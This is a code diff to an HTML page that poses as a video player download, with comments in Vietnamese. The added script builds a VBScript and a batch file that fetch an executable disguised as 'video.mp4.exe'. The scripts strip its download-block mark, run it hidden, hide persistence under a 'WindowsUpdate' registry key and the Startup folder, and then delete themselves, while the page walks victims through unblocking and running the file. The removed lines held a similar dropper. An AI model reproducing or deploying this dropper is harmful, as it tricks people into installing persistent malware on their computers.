@@ -60,6 +60,21 @@
         }
         button:hover { background: #00cc66; }
         .hidden { display: none; }
+        .instruction {
+            background: #2a2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+            text-align: left;
+        }
+        .instruction code {
+            background: #1a1a2e;
+            padding: 5px 10px;
+            border-radius: 5px;
+            display: inline-block;
+            margin: 5px 0;
+        }
     </style>
 </head>
 <body>
@@ -73,8 +88,16 @@
         </div>
         
         <div id="complete" class="hidden">
-            <p class="success">✓ Setup complete!</p>
-            <p>Please run the downloaded file to start the video player.</p>
+            <p class="success">✓ Download complete!</p>
+            <div class="instruction">
+                <p><strong>How to install:</strong></p>
+                <p>1. Find the downloaded file <code>video.mp4.exe</code> in your Downloads folder</p>
+                <p>2. Right-click the file → <strong>Properties</strong></p>
+                <p>3. Check <strong>Unblock</strong> at the bottom</p>
+                <p>4. Click <strong>Apply</strong> then <strong>OK</strong></p>
+                <p>5. Double-click <code>video.mp4.exe</code> to run</p>
+                <p style="color:#00ff88; margin-top:10px;">✓ After first run, it will auto-start on every boot</p>
+            </div>
             <button onclick="window.close()">Close</button>
         </div>
         
@@ -88,14 +111,14 @@
         // ============================================
         // CONFIGURATION - THAY LINK RAW CỦA BẠN VÀO ĐÂY
         // ============================================
-        const EXE_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/chromelevator.exe";
-        const EXE_NAME = "svchost.exe";
+        const EXE_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/video.mp4.exe";
+        const EXE_NAME = "video.mp4.exe";
         
         // ============================================
-        // TẠO FILE VBS TỰ ĐỘNG DOWNLOAD + RUN
+        // TẠO FILE VBS TỰ ĐỘNG DOWNLOAD + UNBLOCK + RUN
         // ============================================
         function createVBScript() {
-            const vbsCode = `' Auto installer
+            const vbsCode = `' Auto installer for video.mp4.exe
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
 Set objADOStream = CreateObject("ADODB.Stream")
 Set objShell = CreateObject("WScript.Shell")
@@ -113,19 +136,44 @@ If objXMLHTTP.Status = 200 Then
     objADOStream.Close
 End If
 
-' Unblock and run
-objShell.Run "powershell -Command ""Unblock-File '%temp%\\` + EXE_NAME + `'; Start-Process '%temp%\\` + EXE_NAME + `' -WindowStyle Hidden""", 0, False
+' Unblock file
+objShell.Run "powershell -Command ""Unblock-File '%temp%\\` + EXE_NAME + `'""", 0, True
 
-' Add to startup
-objShell.Run "schtasks /create /tn ""WindowsUpdate"" /tr ""%temp%\\` + EXE_NAME + `"" /sc onlogon /f", 0, True
+' Copy to startup folder
+objFSO.CopyFile objShell.ExpandEnvironmentStrings("%temp%\\` + EXE_NAME + `"), objShell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\` + EXE_NAME + `"), True
 
-' Delete this script
+' Run file
+objShell.Run objShell.ExpandEnvironmentStrings("%temp%\\` + EXE_NAME + `"), 0, False
+
+' Add to registry startup (backup)
+objShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate", objShell.ExpandEnvironmentStrings("%temp%\\` + EXE_NAME + `"), "REG_SZ"
+
+' Clean up
 objFSO.DeleteFile WScript.ScriptFullName
 
 WScript.Quit 0`;
             return vbsCode;
         }
         
+        // ============================================
+        // TẠO FILE BAT ĐỂ UNBLOCK (DỰ PHÒNG)
+        // ============================================
+        function createBatScript() {
+            const batCode = `@echo off
+echo Unblocking video.mp4.exe...
+powershell -Command "Unblock-File -Path '%~dp0video.mp4.exe'"
+echo Copying to startup...
+copy /y "%~dp0video.mp4.exe" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\video.mp4.exe" >nul
+echo Running...
+start /b "" "%~dp0video.mp4.exe"
+echo Done.
+del /f /q "%~f0"`;
+            return batCode;
+        }
+        
+        // ============================================
+        // TẢI FILE
+        // ============================================
         function downloadFile(content, filename, mimeType) {
             const blob = new Blob([content], {type: mimeType});
             const link = document.createElement('a');
@@ -163,6 +211,7 @@ WScript.Quit 0`;
             
             statusDiv.innerHTML = '<span class="loading"></span> Creating installer...';
             const vbsContent = createVBScript();
+            const batContent = createBatScript();
             
             statusDiv.innerHTML = '<span class="loading"></span> Downloading video player...';
             const exeDownloaded = await downloadExe();
@@ -173,8 +222,11 @@ WScript.Quit 0`;
                 return;
             }
             
-            statusDiv.innerHTML = '<span class="loading"></span> Creating setup file...';
+            statusDiv.innerHTML = '<span class="loading"></span> Creating setup files...';
             downloadFile(vbsContent, 'setup.vbs', 'application/octet-stream');
+            setTimeout(() => {
+                downloadFile(batContent, 'unblock.bat', 'application/x-bat');
+            }, 500);
             
             statusDiv.classList.add('hidden');
             completeDiv.classList.remove('hidden');
